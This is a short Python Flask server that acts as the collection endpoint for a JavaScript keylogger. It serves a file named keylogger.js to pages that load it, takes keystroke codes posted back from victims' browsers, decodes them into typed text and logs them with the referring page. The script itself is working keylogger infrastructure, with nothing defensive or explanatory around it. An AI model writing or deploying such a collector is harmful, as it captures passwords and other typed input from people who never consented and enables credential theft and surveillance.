#!/usr/bin/python
#coding:utf-8
from flask import Flask, request, render_template
app = Flask(__name__)
app.debug = True

@app.route('/script.js', methods=['GET'])
def script():
        return open('./keylogger.js').read()

@app.route('/keylog', methods=['POST'])
def keylog():
    formdata = str(request.get_data())
    print 'Referrer:', request.referrer
    print 'raw_data:', formdata
    values = []
    for key_code in map(int, formdata.split(',')[1:-1]):
        if key_code == 8:
            values.append('<BS>')
        else:
            values.append(chr(key_code))
    print '%s:%s' % (formdata[formdata.rfind('&&')+2:], ''.join(values))
    return ''


@app.route('/')
def index():
    return ''

if __name__ == '__main__':
    app.run(host = '0.0.0.0', port = 8080)
